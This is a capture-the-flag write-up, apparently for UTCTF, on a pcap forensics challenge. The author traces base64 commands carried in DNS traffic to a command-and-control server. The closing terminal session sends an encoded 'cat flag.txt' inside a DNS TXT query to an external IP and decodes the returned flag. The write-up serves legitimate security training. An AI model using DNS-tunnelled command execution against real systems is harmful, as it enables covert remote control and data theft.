### Challenge
One of my servers was compromised, but I can't figure it out. See if you can solve it for me!

--> Given capture.pcap

### Recon
* Checking the packets for weird strings or weird transfers or communication ( Use strings, wireshark )
* Something that was right away evident --> Base64 strings
* All these were related to DNS transactions...
* The destination server that resolves the DNS is executing commands and returning the output!
* TIP: Check the server is live and connect to it!
--> The server does not respond to DNS queries though. Read the packet to replay it with my source IP and MAC with Scapy was not helpful....
--> Nmap for top ports showed that it had http, https ports open. Of course we could not check UDP properly.
--> I was missing something!
* After a good amount of time digging through this, some help from reference to relook at the DNS traffic. The first DNS transaction is weird request which has `dns.google.com` but to another weird server.
* The first dns transaction is where you get the destination IP of where to query! and then use that IP to query for command injection

```
kali@kali:~/Downloads$ nslookup -type=A dns.google.com 35.225.16.21
Server:         35.225.16.21
Address:        35.225.16.21#53

Non-authoritative answer:
Name:   dns.google.com
Address: 3.88.57.227

kali@kali:~/Downloads$ echo "cat flag.txt" | base64
Y2F0IGZsYWcudHh0Cg==
kali@kali:~/Downloads$ nslookup -type=txt Y2F0IGZsYWcudHh0Cg== 3.88.57.227
Server:         3.88.57.227
Address:        3.88.57.227#53

Non-authoritative answer:
Y2F0IGZsYWcudHh0Cg==    text = "dXRmbGFneyRhbDF5X3MzTDFTX3NFNF9kTiR9"

Authoritative answers can be found from:

kali@kali:~/Downloads$ echo "dXRmbGFneyRhbDF5X3MzTDFTX3NFNF9kTiR9" | base64 -d
utflag{$al1y_s3L1S_sE4_dN$}kali@kali:~/Downloads$ 

```

